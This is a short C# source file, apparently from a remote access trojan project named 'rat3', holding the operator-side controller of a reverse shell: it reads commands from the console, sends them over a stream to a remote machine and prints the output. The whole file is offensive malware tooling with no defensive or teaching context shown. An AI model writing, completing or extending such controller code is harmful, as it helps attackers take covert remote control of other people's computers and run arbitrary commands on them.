using Protocol;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace rat3
{
    public static class ReverseShellServer
    {
        public static void ReverseShell(Stream stream)
        {
            Console.Write("[~] how many commands do you want to run: ");

            var numberComamnds = Console.ReadLine();

            stream.WriteString(numberComamnds);

            for (int i = 0; i < int.Parse(numberComamnds); i++)
            {
                Console.Write("[~] enter a command to run: ");

                stream.WriteString(Console.ReadLine()); 

                Console.WriteLine(stream.ReadString());
            }
            
        }

    }
}
